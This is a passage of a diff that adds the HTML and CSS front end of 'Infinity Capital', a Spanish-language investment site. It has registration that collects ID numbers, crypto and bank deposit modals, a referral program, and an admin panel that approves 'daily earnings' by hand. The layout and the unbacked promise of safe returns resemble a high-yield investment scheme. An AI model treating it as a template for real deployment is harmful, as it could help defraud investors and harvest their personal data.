@@ -1,0 +1,3192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Infinity Capital - Inversiones Inteligentes</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #333333;
+            --secondary: #B8860B;
+            --accent: #D4AF37;
+            --light: #f5f5f5;
+            --dark: #1a1a1a;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --danger: #f44336;
+            --text: #333;
+            --text-light: #fff;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--primary), var(--dark));
+            color: var(--text);
+            min-height: 100vh;
+            transition: margin-left 0.3s;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Estilos para el registro e inicio de sesión */
+        .auth-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .auth-form {
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 10px;
+            padding: 30px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .auth-form h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: var(--primary);
+            font-size: 28px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: var(--accent);
+            outline: none;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background-color: var(--secondary);
+            color: var(--dark);
+        }
+
+        .auth-switch {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .auth-switch a {
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Estilos para la notificación de bienvenida */
+        .notification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .notification-content {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .notification-content h2 {
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+
+        .notification-content p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        /* Menú lateral */
+        .sidebar {
+            height: 100%;
+            width: 0;
+            position: fixed;
+            z-index: 1000;
+            top: 0;
+            left: 0;
+            background: linear-gradient(to bottom, var(--primary), var(--dark));
+            overflow-x: hidden;
+            transition: 0.3s;
+            padding-top: 60px;
+            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .sidebar.open {
+            width: 280px;
+        }
+
+        .sidebar a {
+            padding: 15px 25px;
+            text-decoration: none;
+            font-size: 18px;
+            color: var(--light);
+            display: block;
+            transition: 0.3s;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .sidebar a:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--accent);
+        }
+
+        .sidebar a i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .close-sidebar {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 30px;
+            color: var(--light);
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .menu-toggle {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: var(--accent);
+            color: var(--dark);
+            border: none;
+            border-radius: 5px;
+            padding: 10px 15px;
+            cursor: pointer;
+            z-index: 999;
+            font-size: 18px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            display: none;
+        }
+
+        .menu-toggle.visible {
+            display: block;
+        }
+
+        /* Estilos para la pantalla principal */
+        .main-container {
+            display: none;
+            min-height: 100vh;
+            transition: margin-left 0.3s;
+        }
+
+        .main-container.sidebar-open {
+            margin-left: 280px;
+        }
+
+        .header {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 30px 0 20px 0;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            background: linear-gradient(45deg, #808080, #D4AF37, #B8860B, #808080);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradientShift 3s ease infinite, glow 2s infinite alternate;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 5px rgba(212, 175, 55, 0.5);
+            }
+            to {
+                text-shadow: 0 0 20px rgba(212, 175, 55, 0.8), 0 0 30px rgba(212, 175, 55, 0.6);
+            }
+        }
+
+        /* Botones principales en una línea horizontal */
+        .main-buttons-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .main-buttons {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .main-btn {
+            background: linear-gradient(to bottom, var(--secondary), var(--accent));
+            color: var(--dark);
+            border: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 700;
+            font-size: 16px;
+            min-width: 140px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .main-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .main-btn i {
+            margin-bottom: 8px;
+            font-size: 24px;
+        }
+
+        .btn-amount {
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 5px;
+        }
+
+        /* Contenido principal */
+        .panel {
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+
+        .panel h2 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 10px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .info-item {
+            margin-bottom: 15px;
+        }
+
+        .info-item label {
+            font-weight: 600;
+            color: var(--dark);
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .info-item p {
+            color: var(--primary);
+        }
+
+        /* Widget de TradingView */
+        .tradingview-widget-container {
+            margin: 30px 0;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            height: 500px;
+        }
+
+        /* Contadores regresivos */
+        .counters-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .countdown-container {
+            background: linear-gradient(135deg, var(--primary), var(--dark));
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .countdown-title {
+            font-size: 16px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+
+        .countdown {
+            font-size: 24px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+
+        .investment-info {
+            font-size: 14px;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+
+        /* Enlace de referidos */
+        .referral-link {
+            display: flex;
+            align-items: center;
+            background: #f5f5f5;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+
+        .referral-link input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 5px;
+            font-size: 16px;
+        }
+
+        .copy-btn {
+            background: var(--secondary);
+            color: var(--dark);
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+        }
+
+        /* Secciones que se mostrarán al hacer clic en los botones de navegación */
+        .section {
+            display: none;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        .investment-plans {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .plan {
+            border: 2px solid var(--light);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+
+        .plan:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent);
+        }
+
+        .plan h3 {
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+
+        .plan .rate {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--success);
+            margin-bottom: 10px;
+        }
+
+        .plan .range {
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .investment-history {
+            margin-top: 30px;
+        }
+
+        .investment-item {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid var(--accent);
+        }
+
+        .investment-item h4 {
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .news-item {
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .news-item h3 {
+            margin-bottom: 10px;
+            color: var(--secondary);
+        }
+
+        .news-date {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* Modal para recargar/retirar */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        /* Estilos para opciones de criptomonedas y bancos */
+        .crypto-options, .bank-options {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .crypto-option, .bank-option {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .crypto-option:hover, .bank-option:hover {
+            background: #e9e9e9;
+            border-color: var(--accent);
+        }
+
+        .crypto-option.active, .bank-option.active {
+            background: var(--accent);
+            color: var(--dark);
+            border-color: var(--secondary);
+        }
+
+        .wallet-info, .bank-info {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 5px;
+            border-left: 4px solid var(--accent);
+        }
+
+        .wallet-address, .bank-account {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .wallet-address input, .bank-account input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 5px;
+            font-size: 16px;
+        }
+
+        .amount-input {
+            margin: 15px 0;
+        }
+
+        .amount-input input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Icono de admin */
+        .admin-icon {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--accent);
+            color: var(--dark);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 1001;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s;
+            display: none;
+        }
+
+        .admin-icon.visible {
+            display: flex;
+        }
+
+        .admin-icon:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        /* Panel de administración */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            z-index: 1002;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .admin-content {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid var(--accent);
+            padding-bottom: 15px;
+        }
+
+        .admin-header h2 {
+            color: var(--primary);
+        }
+
+        .close-admin {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .admin-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .admin-tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-size: 16px;
+            font-weight: 600;
+            border-bottom: 3px solid transparent;
+        }
+
+        .admin-tab.active {
+            border-bottom: 3px solid var(--accent);
+            color: var(--primary);
+        }
+
+        .admin-tab-content {
+            display: none;
+        }
+
+        .admin-tab-content.active {
+            display: block;
+        }
+
+        .users-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .users-table th, .users-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        .users-table th {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .users-table tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+
+        .admin-action {
+            padding: 5px 10px;
+            margin: 0 2px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .approve-btn {
+            background-color: var(--success);
+            color: white;
+        }
+
+        .reject-btn {
+            background-color: var(--danger);
+            color: white;
+        }
+
+        .info-btn {
+            background-color: var(--accent);
+            color: var(--dark);
+        }
+
+        .delete-btn {
+            background-color: var(--danger);
+            color: white;
+        }
+
+        .payment-info {
+            display: none;
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            border-left: 4px solid var(--accent);
+        }
+
+        /* Checkbox para selección múltiple */
+        .admin-checkbox {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .bulk-actions {
+            margin: 15px 0;
+            display: flex;
+            gap: 10px;
+        }
+
+        footer {
+            background-color: var(--dark);
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 60px;
+        }
+
+        @media (max-width: 768px) {
+            .main-buttons {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .main-btn {
+                min-width: 140px;
+                margin: 5px;
+            }
+            
+            .logo {
+                font-size: 36px;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .tradingview-widget-container {
+                height: 400px;
+            }
+            
+            .counters-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .modal-buttons {
+                flex-direction: column;
+            }
+            
+            .users-table {
+                font-size: 12px;
+            }
+            
+            .admin-action {
+                display: block;
+                margin: 2px 0;
+                width: 100%;
+            }
+            
+            .sidebar.open {
+                width: 100%;
+            }
+            
+            .main-container.sidebar-open {
+                margin-left: 0;
+            }
+            
+            .menu-toggle.visible {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Menú lateral -->
+    <div id="sidebar" class="sidebar">
+        <button class="close-sidebar" id="closeSidebar">&times;</button>
+        <a href="#" data-section="inicio"><i class="fas fa-home"></i> Inicio</a>
+        <a href="#" data-section="inversion"><i class="fas fa-chart-pie"></i> Inversión</a>
+        <a href="#" data-section="miinformacion"><i class="fas fa-id-card"></i> Mi Información</a>
+        <a href="#" data-section="inversionesrealizadas"><i class="fas fa-history"></i> Inversiones Realizadas</a>
+        <a href="#" data-section="misreferidos"><i class="fas fa-user-friends"></i> Mis Referidos</a>
+        <a href="#" data-section="estado"><i class="fas fa-tasks"></i> Estado de Solicitudes</a>
+        <a href="#" id="rechargeBtnMenu"><i class="fas fa-plus-circle"></i> Recargar</a>
+        <a href="#" id="withdrawBtnMenu"><i class="fas fa-money-bill-wave"></i> Retirar</a>
+        <a href="#" data-section="nosotros"><i class="fas fa-info-circle"></i> Nosotros</a>
+        <a href="#" data-section="noticias"><i class="fas fa-newspaper"></i> Noticias</a>
+        <a href="#" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Cerrar Sesión</a>
+    </div>
+
+    <!-- Botón para abrir el menú -->
+    <button class="menu-toggle" id="menuToggle">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Icono de administrador -->
+    <div class="admin-icon" id="adminIcon">
+        <i class="fas fa-lock"></i>
+    </div>
+
+    <!-- Panel de administración -->
+    <div id="adminPanel" class="admin-panel">
+        <div class="admin-content">
+            <div class="admin-header">
+                <h2>Panel de Administración - Infinity Capital</h2>
+                <button class="close-admin" id="closeAdminPanel">Cerrar Panel</button>
+            </div>
+            
+            <div class="admin-tabs">
+                <button class="admin-tab active" data-tab="users">Usuarios</button>
+                <button class="admin-tab" data-tab="recharge">Solicitudes de Recarga</button>
+                <button class="admin-tab" data-tab="withdraw">Solicitudes de Retiro</button>
+                <button class="admin-tab" data-tab="earnings">Ganancias Diarias</button>
+                <button class="admin-tab" data-tab="referrals">Ganancias por Referidos</button>
+            </div>
+            
+            <!-- Tab Usuarios -->
+            <div id="adminUsersTab" class="admin-tab-content active">
+                <h3>Usuarios Registrados</h3>
+                <div class="bulk-actions">
+                    <button class="btn" id="approveSelectedUsers">Aprobar Seleccionados</button>
+                    <button class="btn" style="background: var(--danger);" id="deleteSelectedUsers">Eliminar Seleccionados</button>
+                </div>
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllUsers" class="admin-checkbox"></th>
+                            <th>Email</th>
+                            <th>Teléfono</th>
+                            <th>Cédula</th>
+                            <th>Saldo</th>
+                            <th>Ganancias</th>
+                            <th>Referidos</th>
+                            <th>Estado</th>
+                            <th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminUsersTable">
+                        <!-- Los usuarios se cargarán aquí dinámicamente -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- Tab Solicitudes de Recarga -->
+            <div id="adminRechargeTab" class="admin-tab-content">
+                <h3>Solicitudes de Recarga Pendientes</h3>
+                <div class="bulk-actions">
+                    <button class="btn" id="approveSelectedRecharges">Aprobar Seleccionados</button>
+                    <button class="btn" style="background: var(--danger);" id="rejectSelectedRecharges">Rechazar Seleccionados</button>
+                </div>
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllRecharges" class="admin-checkbox"></th>
+                            <th>Usuario</th>
+                            <th>Tipo</th>
+                            <th>Monto</th>
+                            <th>Fecha</th>
+                            <th>Estado</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminRechargeTable">
+                        <!-- Las solicitudes de recarga se cargarán aquí dinámicamente -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- Tab Solicitudes de Retiro -->
+            <div id="adminWithdrawTab" class="admin-tab-content">
+                <h3>Solicitudes de Retiro Pendientes</h3>
+                <div class="bulk-actions">
+                    <button class="btn" id="approveSelectedWithdraws">Aprobar Seleccionados</button>
+                    <button class="btn" style="background: var(--danger);" id="rejectSelectedWithdraws">Rechazar Seleccionados</button>
+                </div>
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllWithdraws" class="admin-checkbox"></th>
+                            <th>Usuario</th>
+                            <th>Tipo</th>
+                            <th>Monto</th>
+                            <th>Fecha</th>
+                            <th>Estado</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminWithdrawTable">
+                        <!-- Las solicitudes de retiro se cargarán aquí dinámicamente -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- Tab Ganancias Diarias -->
+            <div id="adminEarningsTab" class="admin-tab-content">
+                <h3>Ganancias Diarias Pendientes</h3>
+                <div class="bulk-actions">
+                    <button class="btn" id="approveSelectedEarnings">Aprobar Seleccionados</button>
+                    <button class="btn" style="background: var(--danger);" id="rejectSelectedEarnings">Rechazar Seleccionados</button>
+                </div>
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllEarnings" class="admin-checkbox"></th>
+                            <th>Usuario</th>
+                            <th>Inversión</th>
+                            <th>Ganancia</th>
+                            <th>Fecha</th>
+                            <th>Estado</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminEarningsTable">
+                        <!-- Las ganancias diarias se cargarán aquí dinámicamente -->
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- Tab Ganancias por Referidos -->
+            <div id="adminReferralsTab" class="admin-tab-content">
+                <h3>Ganancias por Referidos Pendientes</h3>
+                <div class="bulk-actions">
+                    <button class="btn" id="approveSelectedReferrals">Aprobar Seleccionados</button>
+                    <button class="btn" style="background: var(--danger);" id="rejectSelectedReferrals">Rechazar Seleccionados</button>
+                </div>
+                <table class="users-table">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllReferrals" class="admin-checkbox"></th>
+                            <th>Usuario</th>
+                            <th>Referido</th>
+                            <th>Comisión</th>
+                            <th>Fecha</th>
+                            <th>Estado</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminReferralsTable">
+                        <!-- Las ganancias por referidos se cargarán aquí dinámicamente -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pantalla de Registro -->
+    <div id="registerScreen" class="auth-container">
+        <div class="auth-form">
+            <h2>Crear Cuenta</h2>
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="regEmail">Correo Electrónico</label>
+                    <input type="email" id="regEmail" required>
+                </div>
+                <div class="form-group">
+                    <label for="regPhone">Número de Teléfono</label>
+                    <input type="tel" id="regPhone" required>
+                </div>
+                <div class="form-group">
+                    <label for="regCedula">Cédula de Identidad</label>
+                    <input type="text" id="regCedula" required>
+                </div>
+                <div class="form-group">
+                    <label for="regPassword">Contraseña</label>
+                    <input type="password" id="regPassword" required>
+                </div>
+                <button type="submit" class="btn">Registrarse</button>
+            </form>
+            <div class="auth-switch">
+                ¿Ya tienes una cuenta? <a href="#" id="goToLogin">Iniciar Sesión</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pantalla de Inicio de Sesión -->
+    <div id="loginScreen" class="auth-container" style="display: none;">
+        <div class="auth-form">
+            <h2>Iniciar Sesión</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginEmail">Correo Electrónico</label>
+                    <input type="email" id="loginEmail" required>
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">Contraseña</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <button type="submit" class="btn">Iniciar Sesión</button>
+            </form>
+            <div class="auth-switch">
+                ¿No tienes una cuenta? <a href="#" id="goToRegister">Registrarse</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notificación de Bienvenida -->
+    <div id="welcomeNotification" class="notification" style="display: none;">
+        <div class="notification-content">
+            <h2>¡Bienvenido a Infinity Capital!</h2>
+            <p>Somos Infinity Capital, una empresa dedicada a la inversión en la bolsa de valores, donde tomamos su inversión y la ponemos a trabajar por usted. Nuestro equipo de expertos analiza constantemente los mercados para maximizar sus ganancias con estrategias de inversión seguras y efectivas.</p>
+            <button id="closeNotification" class="btn">Cerrar</button>
+        </div>
+    </div>
+
+    <!-- Modal para recargar -->
+    <div id="rechargeModal" class="modal">
+        <div class="modal-content">
+            <h3>Recargar Saldo</h3>
+            <p>Saldo actual: <strong>RD$ <span id="currentBalance">0.00</span></strong></p>
+            
+            <div class="modal-buttons">
+                <button class="btn" id="showCryptoOptions">Recargar con Criptomonedas</button>
+                <button class="btn" id="showBankOptions">Recargar con Banco</button>
+            </div>
+            
+            <!-- Opciones de Criptomonedas -->
+            <div id="cryptoOptions" class="crypto-options">
+                <h4>Selecciona una criptomoneda:</h4>
+                <div class="crypto-option" data-crypto="USDT BEP20">USDT BEP20</div>
+                <div class="crypto-option" data-crypto="USDT TRC20">USDT TRC20</div>
+                <div class="crypto-option" data-crypto="LTC">LTC</div>
+                <div class="crypto-option" data-crypto="BNB">BNB</div>
+                <div class="crypto-option" data-crypto="TRX">TRX</div>
+                
+                <!-- Información de Wallet -->
+                <div id="cryptoWalletInfo" class="wallet-info">
+                    <h4>Información de Wallet</h4>
+                    <div class="wallet-address">
+                        <input type="text" id="cryptoWalletAddress" value="" readonly>
+                        <button class="copy-btn" id="copyCryptoWallet">Copiar</button>
+                    </div>
+                    <div class="amount-input">
+                        <input type="number" id="cryptoAmount" placeholder="Monto a recargar (USD)">
+                    </div>
+                    <button class="btn" id="submitCryptoPayment">Realizar Pago</button>
+                </div>
+            </div>
+            
+            <!-- Opciones de Banco -->
+            <div id="bankOptions" class="bank-options">
+                <h4>Selecciona un banco:</h4>
+                <div class="bank-option" data-bank="Banco Reserva">Banco Reserva</div>
+                <div class="bank-option" data-bank="Banco Popular">Banco Popular</div>
+                <div class="bank-option" data-bank="Banco BHD">Banco BHD</div>
+                
+                <!-- Información de Cuenta Bancaria -->
+                <div id="bankAccountInfo" class="bank-info">
+                    <h4>Información de Cuenta</h4>
+                    <div class="bank-account">
+                        <input type="text" id="bankAccountNumber" value="" readonly>
+                        <button class="copy-btn" id="copyBankAccount">Copiar</button>
+                    </div>
+                    <div class="amount-input">
+                        <input type="number" id="bankAmount" placeholder="Monto a recargar (RD$)">
+                    </div>
+                    <button class="btn" id="submitBankPayment">Realizar Pago</button>
+                </div>
+            </div>
+            
+            <button class="btn" style="margin-top: 15px; background: #666;" id="closeRechargeModal">Cancelar</button>
+        </div>
+    </div>
+
+    <!-- Modal para retirar -->
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Retirar Fondos</h3>
+            <p>Saldo disponible: <strong>RD$ <span id="availableWithdraw">0.00</span></strong></p>
+            
+            <div class="modal-buttons">
+                <button class="btn" id="showWithdrawCrypto">Retirar con Criptomonedas</button>
+                <button class="btn" id="showWithdrawBank">Retirar con Banco</button>
+            </div>
+            
+            <!-- Opciones de Criptomonedas para Retiro -->
+            <div id="withdrawCryptoOptions" class="crypto-options">
+                <h4>Selecciona una criptomoneda:</h4>
+                <div class="crypto-option" data-crypto="USDT BEP20">USDT BEP20</div>
+                <div class="crypto-option" data-crypto="USDT TRC20">USDT TRC20</div>
+                <div class="crypto-option" data-crypto="LTC">LTC</div>
+                <div class="crypto-option" data-crypto="BNB">BNB</div>
+                <div class="crypto-option" data-crypto="TRX">TRX</div>
+                
+                <!-- Información de Wallet para Retiro -->
+                <div id="withdrawCryptoInfo" class="wallet-info">
+                    <h4>Ingresa tu Wallet</h4>
+                    <div class="wallet-address">
+                        <input type="text" id="withdrawCryptoWallet" placeholder="Pega tu dirección de wallet aquí">
+                    </div>
+                    <div class="amount-input">
+                        <input type="number" id="withdrawCryptoAmount" placeholder="Monto a retirar (USD)">
+                    </div>
+                    <button class="btn" id="submitWithdrawCrypto">Solicitar Retiro</button>
+                </div>
+            </div>
+            
+            <!-- Opciones de Banco para Retiro -->
+            <div id="withdrawBankOptions" class="bank-options">
+                <h4>Selecciona un banco:</h4>
+                <div class="bank-option" data-bank="Banco Reserva">Banco Reserva</div>
+                <div class="bank-option" data-bank="Banco Popular">Banco Popular</div>
+                <div class="bank-option" data-bank="Banco BHD">Banco BHD</div>
+                
+                <!-- Información de Cuenta para Retiro -->
+                <div id="withdrawBankInfo" class="bank-info">
+                    <h4>Información de Cuenta</h4>
+                    <div class="bank-account">
+                        <input type="text" id="withdrawBankAccount" placeholder="Ingresa tu número de cuenta">
+                    </div>
+                    <div class="amount-input">
+                        <input type="number" id="withdrawBankAmount" placeholder="Monto a retirar (RD$)">
+                    </div>
+                    <button class="btn" id="submitWithdrawBank">Solicitar Retiro</button>
+                </div>
+            </div>
+            
+            <button class="btn" style="margin-top: 15px; background: #666;" id="closeWithdrawModal">Cancelar</button>
+        </div>
+    </div>
+
+    <!-- PANTALLA PRINCIPAL COMPLETA -->
+    <div id="mainScreen" class="main-container">
+        <header class="header">
+            <div class="container">
+                <div class="logo">Infinity Capital</div>
+                
+                <!-- BOTONES PRINCIPALES CON CANTIDADES -->
+                <div class="main-buttons-container">
+                    <div class="main-buttons">
+                        <button class="main-btn">
+                            <i class="fas fa-wallet"></i> Saldo
+                            <div class="btn-amount">RD$ <span id="balanceAmount">0.00</span></div>
+                        </button>
+                        <button class="main-btn">
+                            <i class="fas fa-chart-line"></i> Ganancia
+                            <div class="btn-amount">RD$ <span id="earningsAmount">0.00</span></div>
+                        </button>
